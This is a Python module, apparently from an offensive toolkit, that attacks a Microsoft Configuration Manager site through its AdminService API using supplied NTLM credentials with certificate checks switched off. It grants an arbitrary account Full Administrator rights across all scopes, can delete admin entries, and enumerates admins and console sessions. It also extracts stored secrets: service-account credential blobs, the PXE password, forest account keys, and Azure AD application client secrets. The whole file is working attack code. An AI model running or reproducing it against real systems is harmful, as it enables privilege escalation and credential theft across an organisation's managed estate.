import requests
from requests_ntlm import HttpNtlmAuth
from lib.logger import logger
from urllib3.exceptions import InsecureRequestWarning
import json
from tabulate import tabulate
import pandas as dp


class ADD_ADMIN:
    def __init__(self, username, password, target_ip, logs_dir):
        self.username = username
        self.password = password
        self.target_ip = target_ip
        self.logs_dir = logs_dir
        self.headers = {'Content-Type': 'application/json; odata=verbose'}
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


    def jprint(self, obj):
        text = json.dumps(obj, sort_keys=True, indent=4)
        return (text)
        #logger.debug(text)


    def add(self, targetuser, targetsid):
        self.targetuser = targetuser
        self.targetsid = targetsid

        body = {"LogonName": f"{self.targetuser}", 
            "AdminSid":f"{self.targetsid}",
            "Permissions":[{"CategoryID": "SMS00ALL", 
                            "CategoryTypeID": 29, 
                            "RoleID":"SMS0001R",
                            },
                            {"CategoryID": "SMS00001",
                            "CategoryTypeID": 1, 
                            "RoleID":"SMS0001R", 
                            },
                            {"CategoryID": "SMS00004", 
                            "CategoryTypeID": 1, 
                            "RoleID":"SMS0001R",
                            }],
            "DisplayName":f"{self.targetuser}"
            }
        
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin/"

        try:
            r = requests.post(f"{url}",
                                auth=HttpNtlmAuth(self.username, self.password),
                                verify=False,headers=self.headers, json=body)
            if r.status_code == 201:
                logger.info(f"[+] Successfully added {self.targetuser} as an admin.")
                results = self.jprint(r.json())
                logger.debug(results)
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
        except Exception as e:
                print(e)


    def delete(self, targetuser):
        self.targetuser = targetuser
        try:
            adminid = self.get_adminid()
            if adminid:
                url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin({adminid})"
                r = requests.delete(f"{url}",
                        auth=HttpNtlmAuth(self.username, self.password),
                        verify=False,headers=self.headers)
                if r.status_code == 204:
                    logger.info(f"[+] Successfully removed {self.targetuser} as an admin.")
                else:
                    logger.info("[-] Something went wrong:")
                    logger.info(r.text)
            else:
                 return
        except Exception as e:
                print(e)


    def get_adminid(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin/?$filter=LogonName eq '{self.targetuser}'"
        try:
            r = requests.get(f"{url}",
                                auth=HttpNtlmAuth(self.username, self.password),
                                verify=False,headers=self.headers)
            if r.status_code == 200:
                try:
                    data = r.json()
                    if len(data['value']) == 0:
                         logger.info(f"Target user {self.targetuser} is not configured as an SMS Admin")
                    else:
                        adminid = data['value'][0]['AdminID']
                        logger.debug(f"[+] Got AdminID: {adminid}")
                        return adminid
                except:
                    logger.info("Something went wrong")
                    logger.info(r.text)
                    logger.info(r.status_code)
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)
        
    def show_admins(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin?$filter=RoleNames/any(role: role eq 'Full Administrator')&$select=LogonName"
        try:
            r = requests.get(f"{url}",
                                auth=HttpNtlmAuth(self.username, self.password),
                                verify=False,headers=self.headers)
            if r.status_code == 200:
                data = r.json()
                if data:
                    logger.info("Current Full Admin Users:")
                    admins = data['value']
                    for i in admins:
                         logger.info(i['LogonName'])
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)  
        

    def show_rbac(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin?$select=LogonName,RoleNames"
        try:
            r = requests.get(f"{url}",
                                auth=HttpNtlmAuth(self.username, self.password),
                                verify=False,headers=self.headers)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data['value'], list):
                    tb = dp.DataFrame(data['value'])
                    result = tabulate(tb, showindex=False, headers=tb.columns, tablefmt='grid')
                    logger.info(result)
                    #self.printlog(result)
                else:
                    tb = dp.DataFrame(data['value']['Result'])
                    result = tabulate(tb, showindex=False, headers=tb.columns, tablefmt='grid')
                    logger.info(result)
                    #self.printlog(result)
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)  
        
    def show_consoleconnections(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_ConsoleAdminsData?$select=UserName,MachineName,Source,ConsoleVersion"
        try:
            r = requests.get(f"{url}",
                                auth=HttpNtlmAuth(self.username, self.password),
                                verify=False,headers=self.headers)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data['value'], list):
                    tb = dp.DataFrame(data['value'])
                    result = tabulate(tb, showindex=False, headers=tb.columns, tablefmt='grid')
                    logger.info(result)
                    #self.printlog(result)
                else:
                    tb = dp.DataFrame(data['value']['Result'])
                    result = tabulate(tb, showindex=False, headers=tb.columns, tablefmt='grid')
                    logger.info(result)
                    #self.printlog(result)
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)  

    def get_creds(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_SCI_Reserved?$select=UserName,Reserved2,AccountUsage"
        try:
            r = requests.get(f"{url}",
                                auth=HttpNtlmAuth(self.username, self.password),
                                verify=False,headers=self.headers)
            if r.status_code == 200:
                data = r.json()
                print(self.jprint(data))
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e) 
    

    def get_pxepass(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_SCI_SCProperty?$filter=PropertyName eq 'PXEPassword'&$select=PropertyName,Value1"
        try:
            r = requests.get(f"{url}",
                                auth=HttpNtlmAuth(self.username, self.password),
                                verify=False,headers=self.headers)
            if r.status_code == 200:
                data = r.json()
                print((self.jprint(data)))
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)

    def get_forestkey(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_SCI_SCProperty?$filter=startswith(PropertyName, 'GlobalAccount')&$select=Value1,Value2"
        try:
            r = requests.get(f"{url}",
                                auth=HttpNtlmAuth(self.username, self.password),
                                verify=False,headers=self.headers)
            if r.status_code == 200:
                data = r.json()
                print((self.jprint(data)))
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)
         

    def get_azurecreds(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_AAD_Application_Ex?$select=ClientID,SecretKey"
        try:
            r = requests.get(f"{url}",
                                auth=HttpNtlmAuth(self.username, self.password),
                                verify=False,headers=self.headers)
            if r.status_code == 200:
                data = r.json()
                print((self.jprint(data)))
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)

    def get_azuretenant(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_AAD_Tenant_Ex?$select=Name,TenantID"
        try:
            r = requests.get(f"{url}",
                                auth=HttpNtlmAuth(self.username, self.password),
                                verify=False,headers=self.headers)
            if r.status_code == 200:
                data = r.json()
                print((self.jprint(data)))
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)
